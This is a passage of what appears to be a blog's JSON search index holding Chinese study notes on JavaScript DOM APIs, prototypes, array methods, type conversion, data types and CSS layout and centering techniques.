document.querySelector和document.querySelectorAll 这两个api很相似，通过css选择器来查找元素，注意选择器要符合CSS选择器的规则。 首先来介绍一下document.querySelector。 document.querySelector返回第一个匹配的元素，如果没有匹配的元素，则返回null。 注意，由于返回的是第一个匹配的元素，这个api使用的深度优先搜索来获取元素。我们来看这个例子：\n\u0026lt;div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span class=\u0026quot;test\u0026quot;\u0026gt;第三级的span\u0026lt;/span\u0026gt;\t\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;test\u0026quot;\u0026gt;\t同级的第二个div \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;btnGet\u0026quot; value=\u0026quot;获取test元素\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnGet\u0026quot;).addEventListener(\u0026quot;click\u0026quot;,function(){ var element = document.querySelector(\u0026quot;.test\u0026quot;); alert(element.textContent); }) 这个例子很简单，就是两个class都包含“test”的元素，一个在文档树的前面，但是它在第三级，另一个在文档树的后面，但它在第一级，通过querySelector获取元素时，它通过深度优先搜索，拿到文档树前面的第三级的元素。\ndocument.querySelectorAll的不同之处在于它返回的是所有匹配的元素，而且可以匹配多个选择符，我们来看看下面这个例子\n\u0026lt;div class=\u0026quot;test\u0026quot;\u0026gt; class为test \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;test\u0026quot;\u0026gt; id为test \u0026lt;/div\u0026gt; \u0026lt;input id=\u0026quot;btnShow\u0026quot; type=\u0026quot;button\u0026quot; value=\u0026quot;显示内容\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnShow\u0026quot;).addEventListener(\u0026quot;click\u0026quot;,function(){ var elements = document.querySelectorAll(\u0026quot;#test,.test\u0026quot;);\tfor(var i = 0,length = elements.length;i\u0026lt;length;i++){ alert(elements[i].textContent); }\t}) 这段代码通过querySelectorAll，使用id选择器和class选择器选择了两个元素，并依次输出其内容。要注意两点： （1）querySelectorAll也是通过深度优先搜索，搜索的元素顺序和选择器的顺序无关 （2）返回的是一个非即时的NodeList，也就是说结果不会随着文档树的变化而变化\n兼容性问题：querySelector和querySelectorAll在ie8以下的浏览器不支持。\n节点关系型api 在html文档中的每个节点之间的关系都可以看成是家谱关系，包含父子关系，兄弟关系等等，下面我们依次来看看每一种关系。\n父关系型api  parentNode：每个节点都有一个parentNode属性，它表示元素的父节点。Element的父节点可能是Element，Document或DocumentFragment。 parentElement：返回元素的父元素节点，与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null  兄弟关系型api   previousSibling：节点的前一个节点，如果该节点是第一个节点，则为null。注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下。\n  previousElementSibling：返回前一个元素节点，前一个节点必须是Element，注意IE9以下浏览器不支持。\n  nextSibling：节点的后一个节点，如果该节点是最后一个节点，则为null。注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下。\n  nextElementSibling：返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持。\n  子关系型api  childNodes：返回一个即时的NodeList，表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。 children：一个即时的HTMLCollection，子节点都是Element，IE9以下浏览器不支持。 firstNode：第一个子节点 lastNode：最后一个子节点 hasChildNodes方法：可以用来判断是否包含子节点。  元素属性型api setAttribute setAttribute：根据名称和值修改元素的特性，用法如下。\nelement.setAttribute(name, value); 其中name是特性名，value是特性值。如果元素不包含该特性，则会创建该特性并赋值。 如果元素本身包含指定的特性名为属性，则可以世界访问属性进行赋值，比如下面两条代码是等价的：\nelement.setAttribute(\u0026quot;id\u0026quot;,\u0026quot;test\u0026quot;); element.id = \u0026quot;test\u0026quot;; getAttribute getAttribute返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。用法如下：\nvar value = element.getAttribute(\u0026quot;id\u0026quot;); 元素样式型api window.getComputedStyle window.getComputedStyle是用来获取应用到元素后的样式，假设某个元素并未设置高度而是通过其内容将其高度撑开，这时候要获取它的高度就要用到getComputedStyle，用法如下：\nvar style = window.getComputedStyle(element[, pseudoElt]); element是要获取的元素，pseudoElt指定一个伪元素进行匹配。 返回的style是一个CSSStyleDeclaration对象。 通过style可以访问到元素计算后的样式\ngetBoundingClientRect getBoundingClientRect用来返回元素的大小以及相对于浏览器可视窗口的位置，用法如下：\nvar clientRect = element.getBoundingClientRect(); clientRect是一个DOMRect对象，包含left，top，right，bottom，它是相对于可视窗口的距离，滚动位置发生改变时，它们的值是会发生变化的。除了IE9以下浏览器，还包含元素的height和width等数据，具体可查看链接。\n参考资料  阮一峰：JavaScript教程 狼狼的蓝胖子：Javascript操作DOM常用API总结  ","date":"2019-04-12T10:41:20+08:00","permalink":"http://808Mak1r.github.io/p/test-post/","title":"常见DOM以及API总结"},{"content":"再讲原型与原型链的前提下先讲些概念方便理解\n 对象是什么 面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。\n每一个对象都是功能中心，具有明确分工，可以完成接受信息、处理数据、发出信息等任务。对象可以复用，通过继承机制还可以定制。因此，面向对象编程具有灵活、代码可复用、高度模块化等特点，容易维护和开发，比起由一系列函数或指令组成的传统的过程式编程（procedural programming），更适合多人合作的大型软件项目。\n那么，“对象”（object）到底是什么？我们从两个层次来理解。\n（1）对象是单个实物的抽象。\n一本书、一辆汽车、一个人都可以是对象，一个数据库、一张网页、一个与远程服务器的连接也可以是对象。当实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。\n（2）对象是一个容器，封装了属性（property）和方法（method）。\n属性是对象的状态，方法是对象的行为（完成某种任务）。比如，我们可以把动物抽象为animal对象，使用“属性”记录具体是那一种动物，使用“方法”表示动物的某种行为（奔跑、捕猎、休息等等）。\n构造函数 面向对象编程的第一步，就是要生成对象。前面说过，对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。\n典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。\nJavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成实例对象的函数。它就是对象的模板，描述实例对象的基本结构。一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。\n构造函数就是一个普通的函数，但是有自己的特征和用法。\nvar Vehicle = function () { this.price = 1000; }; 上面代码中，Vehicle就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。\n构造函数的特点有两个。\n函数体内部使用了this关键字，代表了所要生成的对象实例。 生成对象的时候，必须使用new命令。 下面先介绍new命令。\nnew 命令 基本用法 new命令的作用，就是执行构造函数，返回一个实例对象。\nvar Vehicle = function () { this.price = 1000; }; var v = new Vehicle(); v.price // 1000 上面代码通过new命令，让构造函数Vehicle生成一个实例对象，保存在变量v中。这个新生成的实例对象，从构造函数Vehicle得到了price属性。new命令执行时，构造函数内部的this，就代表了新生成的实例对象，this.price表示实例对象有一个price属性，值是1000。\n使用new命令时，根据需要，构造函数也可以接受参数。\nvar Vehicle = function (p) { this.price = p; }; var v = new Vehicle(500); new命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。下面两行代码是等价的，但是为了表示这里是函数调用，推荐使用括号。\n// 推荐的写法 var v = new Vehicle(); // 不推荐的写法 var v = new Vehicle; 一个很自然的问题是，如果忘了使用new命令，直接调用构造函数会发生什么事？\n这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因，this这时代表全局对象，将造成一些意想不到的结果。\nvar Vehicle = function (){ this.price = 1000; }; var v = Vehicle(); v // undefined price // 1000 上面代码中，调用Vehicle构造函数时，忘了加上new命令。结果，变量v变成了undefined，而price属性变成了全局变量。因此，应该非常小心，避免不使用new命令、直接调用构造函数。\n为了保证构造函数必须与new命令一起使用，一个解决办法是，构造函数内部使用严格模式，即第一行加上use strict。这样的话，一旦忘了使用new命令，直接调用构造函数就会报错。\nfunction Fubar(foo, bar){ 'use strict'; this._foo = foo; this._bar = bar; } Fubar() // TypeError: Cannot set property '_foo' of undefined 上面代码的Fubar为构造函数，use strict命令保证了该函数在严格模式下运行。由于严格模式中，函数内部的this不能指向全局对象，默认等于undefined，导致不加new调用会报错（JavaScript 不允许对undefined添加属性）。\n另一个解决办法，构造函数内部判断是否使用new命令，如果发现没有使用，则直接返回一个实例对象。\nfunction Fubar(foo, bar) { if (!(this instanceof Fubar)) { return new Fubar(foo, bar); } this._foo = foo; this._bar = bar; } Fubar(1, 2)._foo // 1 (new Fubar(1, 2))._foo // 1 上面代码中的构造函数，不管加不加new命令，都会得到同样的结果。\nnew 命令的原理 使用new命令时，它后面的函数依次执行下面的步骤。\n创建一个空对象，作为将要返回的对象实例。 将这个空对象的原型，指向构造函数的prototype属性。 将这个空对象赋值给函数内部的this关键字。 开始执行构造函数内部的代码。 也就是说，构造函数内部，this指的是一个新生成的空对象，所有针对this的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即this对象），将其“构造”为需要的样子。\n如果构造函数内部有return语句，而且return后面跟着一个对象，new命令会返回return语句指定的对象；否则，就会不管return语句，返回this对象。\nvar Vehicle = function () { this.price = 1000; return 1000; }; (new Vehicle()) === 1000 // false 上面代码中，构造函数Vehicle的return语句返回一个数值。这时，new命令就会忽略这个return语句，返回“构造”后的this对象。\n但是，如果return语句返回的是一个跟this无关的新对象，new命令会返回这个新对象，而不是this对象。这一点需要特别引起注意。\nvar Vehicle = function (){ this.price = 1000; return { price: 2000 }; }; (new Vehicle()).price // 2000 上面代码中，构造函数Vehicle的return语句，返回的是一个新对象。new命令会返回这个对象，而不是this对象。\n另一方面，如果对普通函数（内部没有this关键字的函数）使用new命令，则会返回一个空对象。\nfunction getMessage() { return 'this is a message'; } var msg = new getMessage(); msg // {} typeof msg // \u0026quot;object\u0026quot; 上面代码中，getMessage是一个普通函数，返回一个字符串。对它使用new命令，会得到一个空对象。这是因为new命令总是返回一个对象，要么是实例对象，要么是return语句指定的对象。本例中，return语句返回的是字符串，所以new命令就忽略了该语句。\nnew命令简化的内部流程，可以用下面的代码表示。\nfunction _new(/* 构造函数 */ constructor, /* 构造函数参数 */ params) { // 将 arguments 对象转为数组 var args = [].slice.call(arguments); // 取出构造函数 var constructor = args.shift(); // 创建一个空对象，继承构造函数的 prototype 属性 var context = Object.create(constructor.prototype); // 执行构造函数 var result = constructor.apply(context, args); // 如果返回结果是对象，就直接返回，否则返回 context 对象 return (typeof result === 'object' \u0026amp;\u0026amp; result != null) ? result : context; } // 实例 var actor = _new(Person, '张三', 28); 原型对象概述 构造函数的缺点 JavaScript 通过构造函数生成新对象，因此构造函数可以视为对象的模板。实例对象的属性和方法，可以定义在构造函数内部。\nfunction Cat (name, color) { this.name = name; this.color = color; } var cat1 = new Cat('大毛', '白色'); cat1.name // '大毛' cat1.color // '白色' 上面代码中，Cat函数是一个构造函数，函数内部定义了name属性和color属性，所有实例对象（上例是cat1）都会生成这两个属性，即这两个属性会定义在实例对象上面。\n通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。\nfunction Cat(name, color) { this.name = name; this.color = color; this.meow = function () { console.log('喵喵'); }; } var cat1 = new Cat('大毛', '白色'); var cat2 = new Cat('二毛', '黑色'); cat1.meow === cat2.meow // false 上面代码中，cat1和cat2是同一个构造函数的两个实例，它们都具有meow方法。由于meow方法是生成在每个实例对象上面，所以两个实例就生成了两次。也就是说，每新建一个实例，就会新建一个meow方法。这既没有必要，又浪费系统资源，因为所有meow方法都是同样的行为，完全应该共享。\n这个问题的解决方法，就是 JavaScript 的原型对象（prototype）。\nprototype 属性的作用 JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。\n下面，先看怎么为对象指定原型。JavaScript 规定，每个函数都有一个prototype属性，指向一个对象。\nfunction f() {} typeof f.prototype // \u0026quot;object\u0026quot; 上面代码中，函数f默认具有prototype属性，指向一个对象。\n对于普通函数来说，该属性基本无用。但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。\nfunction Animal(name) { this.name = name; } Animal.prototype.color = 'white'; var cat1 = new Animal('大毛'); var cat2 = new Animal('二毛'); cat1.color // 'white' cat2.color // 'white' 上面代码中，构造函数Animal的prototype属性，就是实例对象cat1和cat2的原型对象。原型对象上添加一个color属性，结果，实例对象都共享了该属性。\n原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在所有实例对象上。\nAnimal.prototype.color = 'yellow'; cat1.color // \u0026quot;yellow\u0026quot; cat2.color // \u0026quot;yellow\u0026quot; 上面代码中，原型对象的color属性的值变为yellow，两个实例对象的color属性立刻跟着变了。这是因为实例对象其实没有color属性，都是读取原型对象的color属性。也就是说，当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。这就是原型对象的特殊之处。\n如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。\ncat1.color = 'black'; cat1.color // 'black' cat2.color // 'yellow' Animal.prototype.color // 'yellow'; 上面代码中，实例对象cat1的color属性改为black，就使得它不再去原型对象读取color属性，后者的值依然为yellow。\n总结一下，原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。\nAnimal.prototype.walk = function () { console.log(this.name + ' is walking'); }; 上面代码中，Animal.prototype对象上面定义了一个walk方法，这个方法将可以在所有Animal实例对象上面调用。\n原型链 JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……\n如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性。也就是说，所有对象都继承了Object.prototype的属性。这就是所有对象都有valueOf和toString方法的原因，因为这是从Object.prototype继承的。\n那么，Object.prototype对象有没有它的原型呢？回答是Object.prototype的原型是null。null没有任何属性和方法，也没有自己的原型。因此，原型链的尽头就是null。\nObject.getPrototypeOf(Object.prototype) // null 上面代码表示，Object.prototype对象的原型是null，由于null没有任何属性，所以原型链到此为止。Object.getPrototypeOf方法返回参数对象的原型，具体介绍请看后文。\n读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的Object.prototype还是找不到，则返回undefined。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。\n注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。\n举例来说，如果让构造函数的prototype属性指向一个数组，就意味着实例对象可以调用数组方法。\nvar MyArray = function () {}; MyArray.prototype = new Array(); MyArray.prototype.constructor = MyArray; var mine = new MyArray(); mine.push(1, 2, 3); mine.length // 3 mine instanceof Array // true 上面代码中，mine是构造函数MyArray的实例对象，由于MyArray.prototype指向一个数组实例，使得mine可以调用数组方法（这些方法定义在数组实例的prototype对象上面）。最后那行instanceof表达式，用来比较一个对象是否为某个构造函数的实例，结果就是证明mine为Array的实例\nObject.prototype.proto 实例对象的__proto__属性（前后各两个下划线），返回该对象的原型。该属性可读写。\nvar obj = {}; var p = {}; obj.__proto__ = p; Object.getPrototypeOf(obj) === p // true 上面代码通过__proto__属性，将p对象设为obj对象的原型。\n根据语言标准，__proto__属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用Object.getPrototypeof()和Object.setPrototypeOf()，进行原型对象的读写操作。\n原型链可以用__proto__很直观地表示。\nvar A = { name: '张三' }; var B = { name: '李四' }; var proto = { print: function () { console.log(this.name); } }; A.__proto__ = proto; B.__proto__ = proto; A.print() // 张三 B.print() // 李四 A.print === B.print // true A.print === proto.print // true B.print === proto.print // true 上面代码中，A对象和B对象的原型都是proto对象，它们都共享proto对象的print方法。也就是说，A和B的print方法，都是在调用proto对象的print方法。\n获取原型对象方法的比较 如前所述，__proto__属性指向当前对象的原型对象，即构造函数的prototype属性。\nvar obj = new Object(); obj.__proto__ === Object.prototype // true obj.__proto__ === obj.constructor.prototype // true 上面代码首先新建了一个对象obj，它的__proto__属性，指向构造函数（Object或obj.constructor）的prototype属性。\n因此，获取实例对象obj的原型对象，有三种方法。\n obj.proto obj.constructor.prototype Object.getPrototypeOf(obj)  上面三种方法之中，前两种都不是很可靠。__proto__属性只有浏览器才需要部署，其他环境可以不部署。而obj.constructor.prototype在手动改变原型对象时，可能会失效。\nvar P = function () {}; var p = new P(); var C = function () {}; C.prototype = p; var c = new C(); c.constructor.prototype === p // false 上面代码中，构造函数C的原型对象被改成了p，但是实例对象的c.constructor.prototype却没有指向p。所以，在改变原型对象时，一般要同时设置constructor属性。\nC.prototype = p; C.prototype.constructor = C; var c = new C(); c.constructor.prototype === p // true 因此，推荐使用第三种Object.getPrototypeOf方法，获取原型对象。\n参考链接：阮一峰-JavaScript教程\n","date":"2019-04-06T19:12:56+08:00","permalink":"http://808Mak1r.github.io/p/%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE/","title":"原型与原型链"},{"content":"自己总结代码题 1.使得 students 按分数的高低从大到小排列\nvar students = ['小明','小红','小花'] var scores = { 小明: 59, 小红: 99, 小花: 80 } students.sort(???) 请填写 ??? 使得 students 按分数的高低从大到小排列\nfunction ( x , y ) { return scores[y]-scores[x] }   var a = [1,2,3,4,5,6,7,8,9] a.filter(???).map(???) // [4,16,36,64]  获取所有偶数 得到所有偶数的平方  a.filter( function ( value , key ) { return value % 2 === 0 }).map ( function ( value ) { return value * value })   var a = [1,2,3,4,5,6,7,8,9] a.reduce(???,???) 计算所有奇数的和\na.reduce(function(sum,b){ if( b % 2 !=0){ sum = sum + b }return sum },0) 数组求和，一般我们的想法都是去遍历数组各项，然后累加。 那就是这样：\n function sumArr(arr){ var sum = 0; for(var i = 0;i\u0026lt;=arr.length;i++){ sum += arr[i];//前提是arr中各项是数字，而不是数字字符串 //如果是数字字符串：sum += Number(arr[i]); } return sum; } 又或者是forEach遍历：\nfunction sumArr(arr){ var sum = 0; arr.forEach(function(val,index,arr){ sum += val; }) return sum; } 还有一种比较黑科技的写法：\nfunction sumArr(arr){ return eval(arr.join(\u0026quot;+\u0026quot;)) }//直接把他变成各个数的加法运算字符串 当然还有这种被人广泛称赞的函数式编程的写法：\nfunction sumArr(arr){ return arr.reduce(function(prev,cur){ return prev + cur; },0); } //reduce方法有两个参数，一个是callbackfunction(回调函数)， //二是设置prev的初始类型和初始值 concat concat() 方法用于连接两个或多个数组。\n该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。\narrayObject.concat(arrayX,arrayX,......,arrayX) 返回值\n返回一个新的数组。该数组是通过把所有 arrayX 参数添加到 arrayObject 中生成的。如果要进行 concat() 操作的参数是数组，那么添加的是数组中的元素，而不是数组。\nforEach forEachfindIndex()方法返回满足回调条件的数组中第一个元素的索引。否则将返回1。\narr.forEach(function callback(currentValue, index, array) { //your iterator }[, thisArg]); callback：回调函数。\ncurrentValue：在数组中处理当前元素\nindex：在数组中处理当前元素的索引。\narray：当前数组\nvar a = ['a', 'b', 'c']; a.forEach(function(element) { console.log(element); }); // a // b // c join join()将数组中的所有元素(或类似数组的对象)连接到一个字符串中\narr.join() arr.join(separator) separator：分隔符\nvar a = ['Wind', 'Rain', 'Fire']; a.join(); // 'Wind,Rain,Fire' a.join('-'); // 'Wind-Rain-Fire' keys keys()方法返回一个新的数组迭代器对象，该对象包含数组中每个索引的键\narr.keys() map map()方法创建一个新的数组，该数组的结果是调用调用数组中的每个元素的函数\nvar new_array = arr.map(function callback(currentValue, index, array) { // Return element for new_array }[, thisArg]) reduce reduce()方法对累加器和数组中的每个元素(从左到右)使用一个函数，以将其还原为一个值\n","date":"2019-04-05T19:13:22+08:00","permalink":"http://808Mak1r.github.io/p/js%E6%95%B0%E7%BB%84api%E8%BF%90%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81%E6%80%BB%E7%BB%93/","title":"JS数组API运用相关代码总结"},{"content":"类型转换 本文分别讲下数据类型之间的相互转换\n转换为string    数据类型.toString    数据类型 string     number toString   boolean toString   symbol 不研究   null 报错   undefined 报错   object toString   2.     数据类型 + '' '' + 数据类型 3.\nwindow.String(/*数据类型*/) 转换为boolean    Boolean(/*数据类型*/)   因为!表示取反 !!表示负负得正\n!!/*数据类型*/ 5个falsy值  数字里只有0 NaN false string中只有空字符串'\u0026lsquo;是false null 和undefined 只有一个值，就是false obiect 都是true,object包括数组和函数所以他们俩也是true falsy参考链接  转换为number '1'--\u0026gt;1    Number('1')===1   parseInt('1',10)===1//10表示十进制 3.\nparseFloat('1.23')===1.23   '1'-0===1 5.\n +'1'===1 +'-1'===-1 转为null和undefined都只有一个值 ","date":"2019-04-04T19:52:50+08:00","permalink":"http://808Mak1r.github.io/p/js%E9%87%8C%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/","title":"JS里的数据类型转换"},{"content":"JS里的7种数据类型 JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 新增的第七种 Symbol 类型的值，不描述。）\n 数值（number）：整数和小数（比如1和3.14） 字符串（string）：文本（比如Hello World）。 布尔值（boolean）：表示真伪的两个特殊值，即true（真）和false（假） undefined：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值 null：表示空值，即此处的值为空。 对象（object）：各种值组成的集合。 Symbol（符号）：https://developer.mozilla.org/zh-CN/docs/Glossary/Symbol  string 表示可以用\n' '//空字符串 \u0026quot; \u0026quot;//空字符串 转义符号为\\\nvar a = \u0026quot;'\u0026quot;//单引号 var a = '\u0026quot;'//双引号 var a = '\\''//单引号 var n = '\\n'//回车 var t = '\\t'//Tab(制表符) var b = '\\\\'//表示\\符号 多行字符串表示\n//不是字符串里有回车 var s = '12345\\ 67890'//坑人语法不使用 var s2 = '12345' '67890' //易报错5之后有看不见的空格 以上两种不建议使用\nvar s3 = '12345'+ '67890' ==建议使用这个语法==\n在ES6中有个新的语法特性为:\nvar s4 = '12345 //此处5后面有个回车 67890'//实际为11个字符包含一个回车 关于null和undefined\n 变量没有值-undefined(语法)    有一个对象objest，现在不想赋值-null\n  有一个非对象，不想赋值-undefined\n 对象也是哈希表 关于命名\nperson['name'] person[name] person.name //下面两种符合标识符命名规则的情况下3种相等 typeof 运算符 JavaScript 有三种方法，可以确定一个值到底是什么类型。\ntypeof运算符 instanceof运算符 Object.prototype.toString方法 instanceof运算符和Object.prototype.toString方法。这里介绍typeof运算符。\ntypeof运算符可以返回一个值的数据类型。\n数值、字符串、布尔值分别返回number、string、boolean。\ntypeof 123 // \u0026quot;number\u0026quot; typeof '123' // \u0026quot;string\u0026quot; typeof false // \u0026quot;boolean\u0026quot; 函数返回function。\nfunction f() {} typeof f // \u0026quot;function\u0026quot; undefined返回undefined。\ntypeof undefined // \u0026quot;undefined\u0026quot; 利用这一点，typeof可以用来检查一个没有声明的变量，而不报错。\nv // ReferenceError: v is not defined typeof v // \u0026quot;undefined\u0026quot; 上面代码中，变量v没有用var命令声明，直接使用就会报错。但是，放在typeof后面，就不报错了，而是返回undefined。\n实际编程中，这个特点通常用在判断语句。\n// 错误的写法 if (v) { // ... } // ReferenceError: v is not defined // 正确的写法 if (typeof v === \u0026quot;undefined\u0026quot;) { // ... } 对象返回object。\ntypeof window // \u0026quot;object\u0026quot; typeof {} // \u0026quot;object\u0026quot; typeof [] // \u0026quot;object\u0026quot; 上面代码中，空数组（[]）的类型也是object，这表示在 JavaScript 内部，数组本质上只是一种特殊的对象。这里顺便提一下，instanceof运算符可以区分数组和对象。instanceof运算符的详细解释，请见《面向对象编程》一章。\nvar o = {}; var a = []; o instanceof Array // false a instanceof Array // true null返回object。 typeof null // \u0026quot;object\u0026quot; null的类型是object，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑null，只把它当作object的一种特殊值。后来null独立出来，作为一种单独的数据类型，为了兼容以前的代码，typeof null返回object就没法改变了。\n参考链接\n 阮一峰，JavaScript教程  ","date":"2019-04-03T18:42:20+08:00","permalink":"http://808Mak1r.github.io/p/js%E9%87%8C%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","title":"JS里的数据类型"},{"content":"CSS布局 float 布局 float 布局应该是目前各大网站用的最多的一种布局方式了，但是也特别复杂，这里详细讲一下\n首先，什么是浮动？\n浮动元素是脱离文档流的，但不脱离文本流，这是什么意思呢，用过 word 的应该知道有一种图片环绕的方式是文字环绕吧，就是这种效果。\n那么它有什么特点呢\n 对自身的影响  float 元素可以形成块，如 span元素。可以让行内元素也拥有宽和高，因为块级元素具有宽高 浮动元素的位置尽量靠上 尽量靠左（float:left）或右（float:right），如果那一行满足不了浮动元素的宽度要求，则元素会往下掉   对兄弟元素的影响  不影响其他块级元素的位置 影响其他块级元素的文本 上面贴非 float 元素 旁边贴 float 元素或者边框   对父级元素的影响  从布局上 “消失” 高度塌陷    如果有以下html结构，设置左右两栏布局\n\u0026lt;div class=\u0026quot;parent\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;leftChild\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;rightChild\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  设置浮动：左右布局常用的方法就是为子元素设置浮动，然后在其父元素上使用clearfix类清除浮动。示例代码如下：  .clearfix::after{ content:\u0026quot;\u0026quot;; display:block; clear:both; } .leftChild, .rightChild{ float:left; } -设置position绝对定位，为父元素设置position:relative; 为子元素设置position:absolute 。示例代码如下：\n.parent{ position:relative; } .leftChild{ position:absolute; left:0; top:0; } .rightChild{ position:absolute; left:200px; top:0; } 三栏布局\n左中右布局主要方法也是浮动或者绝对定位，不过可以分情况选择其一使用甚至结合使用。\n三栏布局，思路主要是左边一个浮动元素，右边一个浮动元素。这里有个小问题，中间的元素要写在最后，因为中间元素假设有块级元素的话，会影响右边浮动元素的定位，这里演示一下\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;CSS 布局\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;style\u0026gt; *{ margin: 0; padding: 0; } .container{ width: 400px; height: 200px; } .left{ background-color: yellow; float: left; height: 100%; width:100px; } .right{ background-color: green; float: right; height: 100%; width:100px; } .middle{ background-color: red; margin-left: 100px; margin-right: 100px; height:100%; } .container::after{ content: ''; display: block; visibility: hidden; clear: both } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=container\u0026gt; \u0026lt;div class=left\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;middle\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=right\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 因为浮动元素会把块级元素的位置空出来，所以这里右边的浮动元素把上面的位置空了下来，所以正确的写法应该是\n\u0026lt;div class=container\u0026gt; \u0026lt;div class=left\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=right\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;middle\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 特定情况下使用浮动还是绝对定位\n 使用浮动时：不需要计算特别精确的位置，不过不易操控，浮动元素的宽度需要注意，否则会换行展示，适用于导航栏等地方。 使用绝对定位：需要计算元素的具体位置，不过更加准确，易于操控。 当某些元素的位置要根据父元素的大小自适应，内容宽度无法确定时，建议使用浮动 当特定元素的位置是相对父元素固定，或者内容宽高确定，需要精确定位甚至以后要用js操作变换位置时，建议使用浮动  关于居中 水平居中\n 文字的水平居中  将一段文字置于容器的水平中点，只要设置text-align属性即可：\n　text-align:center;  容器的水平居中  先为该容器设置一个明确宽度，然后将margin的水平值设为auto即可。\n　div#container { width:760px; margin:0 auto; } 垂直居中\n 文字的垂直居中  单行文字的垂直居中，只要将行高与容器高设为相等即可。\n比如，容器中有一行数字。\n　\u0026lt;div id=\u0026quot;container\u0026quot;\u0026gt;1234567890\u0026lt;/div\u0026gt; 然后CSS这样写：\n div#container {height: 35px; line-height: 35px;}  容器的垂直居中  比如，有一大一小两个容器，请问如何将小容器垂直居中？\n　\u0026lt;div id=\u0026quot;big\u0026quot;\u0026gt; \u0026lt;div id=\u0026quot;small\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 首先，将大容器的定位为relative。\n　div#big{ position:relative; height:480px; } 然后，将小容器定位为absolute，再将它的左上角沿y轴下移50%，最后将它margin-top上移本身高度的50%即可。\n　div#small { position: absolute; top: 50%; height: 240px; margin-top: -120px; } 